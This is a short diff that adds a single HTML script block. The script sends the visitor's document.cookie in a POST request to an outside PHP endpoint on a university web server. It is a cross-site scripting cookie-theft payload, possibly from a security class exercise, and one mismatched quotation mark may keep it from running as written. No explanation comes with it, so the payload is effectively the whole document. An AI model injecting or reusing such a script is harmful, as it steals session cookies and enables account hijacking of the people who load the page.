@@ -1,0 +1,7 @@
+<script>
+var xhttp = new XMLHttpRequest();
+xhttp.open("POST", "https://cse.taylor.edu/~nflasher/authenticate.php", true);
+xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+xhttp.send("cookie=” + document.cookie);
+</script>
+
